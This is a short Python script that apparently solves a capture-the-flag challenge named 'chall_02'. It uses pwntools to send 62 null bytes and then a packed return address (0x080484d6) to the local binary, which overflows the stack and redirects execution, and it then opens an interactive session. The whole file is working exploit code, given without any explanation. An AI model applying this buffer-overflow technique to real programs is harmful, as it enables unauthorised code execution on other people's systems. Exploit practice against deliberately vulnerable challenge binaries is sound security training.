from pwn import *
def main():
	p = process("./chall_02")
	print(p.recv())
	p.sendline()
	payload = (chr(int("00", 16))* 62).encode() + p32(0x080484d6)
	print(payload)
	p.sendline(payload)
	p.interactive()
main()
